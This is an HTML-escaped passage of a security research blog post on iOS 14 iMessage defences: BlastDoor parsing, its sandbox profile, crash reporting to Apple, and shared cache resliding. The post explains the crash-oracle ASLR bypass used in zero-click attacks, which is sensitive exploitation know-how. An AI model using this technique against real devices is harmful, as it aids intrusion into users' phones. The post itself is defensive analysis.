class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; isFromStorage: false, isLastFromStorage: false&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; ),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; messageSubType: MessageType.textMessage(BlastDoor.Message(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; plainTextBody: Optional(&amp;quot;Hello World&amp;quot;),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; plainTextSubject: nil,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content: Optional(BlastDoor.AttributedString(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; attributes: [&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BlastDoor.BaseWritingDirectionAttribute(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; range: Range(0..&amp;lt;11), direction: WritingDirection.natural&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ), &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BlastDoor.MessagePartAttribute(&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; range: Range(0..&amp;lt;11), partNumber: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; )&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ], &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; string: &amp;quot;Hello World&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; )),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; _participantDestinationIdentifiers: [&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;mailto:sender@foo.bar&amp;quot;,&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;mailto:receiver@foo.bar&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ], &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; attributionInfo: []&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; )),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; encryptionType: BlastDoor.TextMessage.EncryptionType.pair_ec, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; replyToGUID: Optional(6401430E-CDD3-4BC7-A377-7611706B431F), &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; _threadIdentifierGUID: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; _expressiveSendStyleIdentifier: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; _groupID: Optional(&amp;quot;008412B9-A4F7-4B96-96C3-70C4276CB2BE&amp;quot;), &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; currentGroupName: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; groupParticipantVersion: Optional(0),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; groupProtocolVersion: Optional(8),&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; groupPhotoCreationTime: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; messageSummaryInfo: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; nicknameInformation: nil, &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; truncatedNicknameRecordKey: nil&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;One can roughly associate every field in this data structure with parts of the on-wire iMessage format. For example, the &lt;/span&gt;&lt;span class="c6"&gt;plainTextBody&lt;/span&gt;&lt;span&gt;&amp;nbsp;field contains the content of the `t` field, while the &lt;/span&gt;&lt;span class="c6"&gt;content&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;field corresponds to the content of the `x` field.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;Besides simple text messages, iMessages can additionally contain attachments (essentially arbitrary files which are encrypted and temporarily uploaded to iCloud) as well as rather complex serialized &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://developer.apple.com/documentation/foundation/nskeyedarchiver"&gt;NSKeyedArchiver&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;archives, which &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://googleprojectzero.blogspot.com/2019/08/the-fully-remote-attack-surface-of.html"&gt;have been the source of bugs in the past&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;For these types of iMessages, the following additional parsing steps are necessary:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c15 lst-kix_ezf2mrk385uq-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;Unpack attachment metadata (NSKeyedArchiver format)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;Download attachments from iCloud server&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;Deserialize NSKeyedArchiver plugin archives and generate a preview for the notification&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As an example, consider what happens when a user sends a link to a website over iMessage. In that case, the sending device will first render a preview of the webpage and collect some metadata about it (such as the title and page description), then pack those fields into an NSKeyedArchiver archive. This archive is then encrypted with a temporary key and uploaded to the iCloud servers. Finally, the link as well as the decryption key are sent to the receiver as part of the iMessage. In order to create a useful user notification about the incoming iMessage, this data has to be processed by the receiver on a 0-click code path. As that again involves a fair amount of complexity, it is also done inside BlastDoor: after receiving the BlastDoor reply from above and realizing that the message contains an attachment, &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;first instructs &lt;/span&gt;&lt;span class="c6"&gt;IMTransferAgent&lt;/span&gt;&lt;span&gt;&amp;nbsp;to download and decrypt the iCloud attachment. Afterwards, it will call into &lt;/span&gt;&lt;span class="c10 c6"&gt;-[IMTranscodeController decodeiMessageAppPayload:bundleID:completionBlock:blockUntilReply:]&lt;/span&gt;&lt;span&gt;&amp;nbsp;w&lt;/span&gt;&lt;span&gt;hich forwards the relevant data to the&lt;/span&gt;&lt;span&gt;&amp;nbsp;IMTranscoderAgent, which then proceeds into &lt;/span&gt;&lt;span class="c10 c6"&gt;+[IMAttachmentBlastdoor sendBalloonPluginPayloadData:withBundleIdentifier:completionBlock:]&lt;/span&gt;&lt;span class="c6 c20"&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;a&lt;/span&gt;&lt;span&gt;nd finally calls &lt;/span&gt;&lt;span class="c10 c6"&gt;-[IMMessagesBlastDoorInterface defuseBalloonPluginPayload:withIdentifier:resultHandler:]&lt;/span&gt;&lt;span&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;In the &lt;/span&gt;&lt;span&gt;BlastDoor service, the plugin data decoding is then again performed in Swift, and dispatched to the corresponding plugin type, as determined by the plugin id. For RichLinks (plugin id com.apple.messages.URLBalloonProvider), processing ends up in &lt;/span&gt;&lt;span class="c6 c10"&gt;LinkPresentation.MessagesPayload.init(dataRepresentation:)&lt;/span&gt;&lt;span class="c2"&gt;, which deserializes the NSKeyedArchiver payload and to extract the preview image and URL metadata from it in order to generate a preview message.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c17" id="h.v7m4aqoict2j"&gt;&lt;span class="c14"&gt;Sandboxing&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;The sandbox profile can be found in &lt;/span&gt;&lt;span&gt;System/Library/Sandbox/Profiles/blastdoor.sb&lt;/span&gt;&lt;span&gt;&amp;nbsp;and is also attached at the end of this blog post. It appears to be identical on iOS and macOS. The profile can be studied statically, and for that purpose is attached at the bottom of this blogpost, or dynamically, for example by using the &lt;/span&gt;&lt;span class="c6"&gt;sandbox-exec&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;tool:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; echo &amp;quot;(allow process-exec (literal \&amp;quot;$(pwd)/test\&amp;quot;))&amp;quot; &amp;gt;&amp;gt; ./blastdoor.sb&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; clang -o test test.c &amp;nbsp; # try to open files, network connections, etc.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;gt; sandbox-exec -f ./blastdoor.sb ./test&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;The sandbox profile states: &lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;;;; This profile contains the rules necessary to make BlastDoor as close to&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;;;; compute-only as possible, while still remaining functional.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;And indeed, the sandbox profile is quite tight:&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c15 lst-kix_xkot2rd1rwjd-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;only a handful of local IPC services, namely &lt;/span&gt;&lt;span class="c6"&gt;diagnosticd&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c6"&gt;logd&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c6"&gt;opendirectoryd&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class="c6"&gt;syslogd&lt;/span&gt;&lt;span&gt;, and &lt;/span&gt;&lt;span class="c6"&gt;notifyd&lt;/span&gt;&lt;span class="c2"&gt;, can be reached&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;almost all file system interaction is blocked&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;any interaction with IOKit drivers (historically a big source of vulnerabilities) is forbidden&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;outbound &lt;/span&gt;&lt;span&gt;network access is denied&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;Furthermore, the profile makes use of syscall filtering to restrict the interactions with the core kernel. However, as of now the syscall filter seems to be in &amp;ldquo;permissive&amp;rdquo; mode: &lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;;; To be uncommented once the system call whitelist is complete...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;;; (deny syscall-unix (with send-signal SIGKILL))&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;As such, the BlastDoor service is still allowed to perform any syscall, but it is to be expected that the syscall filtering will soon be put into &amp;ldquo;enforcement mode&amp;rdquo;, which would further boost its effectiveness.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c17" id="h.rdbm0q1mrv2k"&gt;&lt;span class="c14"&gt;Crash Monitoring?&lt;/span&gt;&lt;/h2&gt; &lt;p class="c1"&gt;&lt;span&gt;An interesting side effect of the new processing pipeline is that &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;is now able to detect when an incoming message caused a crash in BlastDoor (it will receive an XPC error). Even more interesting is the fact that &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;appears to be informing Apple&amp;rsquo;s servers about such events, as can be seen by setting a breakpoint on &lt;/span&gt;&lt;span class="c6 c23"&gt;-[APSConnectionServer handleSendOutgoingMessage:]&lt;/span&gt;&lt;span&gt;&amp;nbsp;in &lt;/span&gt;&lt;span class="c6"&gt;apsd&lt;/span&gt;&lt;span class="c2"&gt;, the daemon responsible for implementing Apple&amp;rsquo;s push services (on top of which iMessage is built). Displaying the outgoing message will show the following:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;(lldb) po [$x2 dictionaryRepresentation]&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSCritical = 1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSMessageID = 543;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSMessageIdentifier = 1520040396;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSMessageTopic = &amp;quot;com.apple.madrid&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSMessageUserInfo = &amp;nbsp; &amp;nbsp; {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; c = 115;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fR = 13500;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="c19 c29"&gt;fRM = &amp;quot;c-100-BlastDoor.Explosion-1-com.apple.BlastDoor.XPC-ServiceCrashed&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fU = {length = 16, bytes = 0x3a4912626c9645f98cb26c7c2d439520};&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; i = 1520040396;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; nr = 1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; t = {length = 32, bytes = ... };&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ua = &amp;quot;[macOS,11.1,20C69,Macmini9,1]&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; v = 7;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; };&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSOutgoingMessageSenderTokenName = 501;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSPayloadFormat = 1;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSTimeout = 120;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; APSTimestamp = &amp;quot;2021-01-06 19:52:10 +0000&amp;quot;;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c6"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;As can be seen, &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span&gt;&amp;nbsp;is apparently informing the iMessage servers that the message with the UUID 0x3a4912626c9645f98cb26c7c2d439520 (&lt;/span&gt;&lt;span class="c6"&gt;fU&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;key) has caused a crash in BlastDoor.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;It is unclear what the purpose of this is without access to the server&amp;rsquo;s code. While these notifications may simply be used for statistical purposes, they would also give Apple a fairly clear signal about attacks against iMessage involving brute-force and a somewhat weaker signal about any failed exploits against the BlastDoor service.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;In my experiments, after observing one of these crash notifications, the server would start directly sending delivery receipts to the sender for messages that hadn&amp;#39;t actually been processed by the receiver yet. Possibly this is another, independent effort to break the crash oracle technique by confusing the sender, but that is hard to verify without access to the code running on the server. In any case, it is worth noting that this &amp;ldquo;spoofing&amp;rdquo; of delivery receipts by the server is generally possible as the message UUID, which is more or less the only content of a delivery receipt, is part of the non-end2end encrypted payload and is thus known to the server (break on &lt;/span&gt;&lt;span class="c6 c23"&gt;-[APSConnectionServer handleSendOutgoingMessage:]&lt;/span&gt;&lt;span&gt;&amp;nbsp;and inspect outgoing iMessages to verify this, the UUID will be in the &lt;/span&gt;&lt;span class="c6"&gt;U&lt;/span&gt;&lt;span&gt;&amp;nbsp;key, while the e2e-encrypted data will be in the &lt;/span&gt;&lt;span class="c6"&gt;P&lt;/span&gt;&lt;span&gt;&amp;nbsp;key)&lt;/span&gt;&lt;span class="c2"&gt;. This is most likely necessary so the server can track which messages have already been delivered and which ones it still needs to keep around for delivery in the future.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c13" id="h.tev8uvvac7bs"&gt;&lt;span class="c5"&gt;Shared Cache Resliding&lt;/span&gt;&lt;/h1&gt; &lt;p class="c1"&gt;&lt;span&gt;Previously, when exploiting an iMessage memory corruption bug, a &amp;ldquo;crash oracle&amp;rdquo; could be used to reveal the location of the shared cache region in memory: the attacker would trigger the memory corruption bug in a way that would cause an access to a memory location somewhere in the region 0x180000000 - 0x280000000 (where the shared cache can be mapped). If the memory was valid, no crash would occur and &lt;/span&gt;&lt;span class="c6"&gt;imagent&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;would then send a delivery receipt to the attacker. However, If a crash occurred, no such receipt would be delivered, informing the attacker that the address was unmapped. Through clever selection of the queried addresses, the location of the shared cache could be revealed in logarithmic time, with only about 20 messages.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c2"&gt;However, with iOS 14 Apple has added a mechanism to re-randomize the location of the shared cache region for an &amp;ldquo;attacked&amp;rdquo; process, thus breaking a fundamental assumption of this technique and rendering it ineffective. This is significant as the crash oracle technique was one of very few, if not the only, fairly generic ASLR bypass techniques usable in 0-click iMessage attacks.&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span&gt;To understand how the shared cache resliding works, one can start by looking at the kernel. In iOS 14, the kernel can now have &lt;/span&gt;&lt;span class="c25"&gt;two&lt;/span&gt;&lt;span&gt;&amp;nbsp;active shared cache regions: the &amp;ldquo;regular&amp;rdquo; region and &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/osfmk/vm/vm_shared_region.h#L224"&gt;a &amp;ldquo;reslided&amp;rdquo; region&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. During an attack, the following then happens:&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c4"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c15 lst-kix_hmo7gyj5poo-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c2"&gt;When an attacker attempts to use a crash-oracle-based technique, the attacked process would quickly end up accessing unmapped memory in the range 0x180000000 - 0x280000000 (where the shared cache is mapped) and crashes&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;The kernel handles the segmentation fault generated by the CPU, and &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_sig.c#L2009"&gt;sets a specific flag in the crash info&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;that signals that the crash happened inside the shared cache region&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;At the same time, the kernel will &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/kern/kern_sig.c#L2040"&gt;mark the currently active reslided shared cache region (if one exists) as stale&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;, causing it to be recreated and thus re-randomized the next time it is used&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span class="c6"&gt;launchd&lt;/span&gt;&lt;span&gt;&amp;nbsp;(as the parent process of the crashed service) receives the crash info, notices the &lt;/span&gt;&lt;span class="c6"&gt;OS_REASON_FLAG_SHAREDREGION_FAULT&lt;/span&gt;&lt;span&gt;&amp;nbsp;flag, and sets the &lt;/span&gt;&lt;span class="c6"&gt;ReslideSharedCache&lt;/span&gt;&lt;span&gt;&amp;nbsp;property on the service associated with the crashed process (see `&lt;/span&gt;&lt;span class="c6"&gt;launchctl procinfo $pid&lt;/span&gt;&lt;span&gt;` and search for `&lt;/span&gt;&lt;span class="c6"&gt;reslide shared cache = 1&lt;/span&gt;&lt;span class="c2"&gt;`)&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;The next time the service is restarted, &lt;/span&gt;&lt;span class="c6"&gt;launchd&lt;/span&gt;&lt;span&gt;&amp;nbsp;then adds the &lt;/span&gt;&lt;span class="c7 c6"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/bsd/sys/spawn.h#L78"&gt;POSIX_SPAWN_RESLIDE&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;attribute for &lt;/span&gt;&lt;span class="c7 c6"&gt;&lt;a class="c161" href="https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/posix_spawn.2.html"&gt;posix_spawn&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;due to the &lt;/span&gt;&lt;span class="c6"&gt;ReslideSharedCache&lt;/span&gt;&lt;span&gt;&amp;nbsp;property&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c1 c11 li-bullet-0"&gt;&lt;span&gt;In the kernel, this flag now causes the newly created process to be given the &lt;/span&gt;&lt;span class="c7"&gt;&lt;a class="c161" href="https://github.com/apple/darwin-xnu/blob/d4061fb0260b3ed486147341b72468f836ed6c8f/osfmk/vm/vm_shared_region.h#L224"&gt;reslided shared cache image&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. However, as no active reslided region currently exists (the previous one was marked as stale in step 3.), a new one is created at a newly randomized 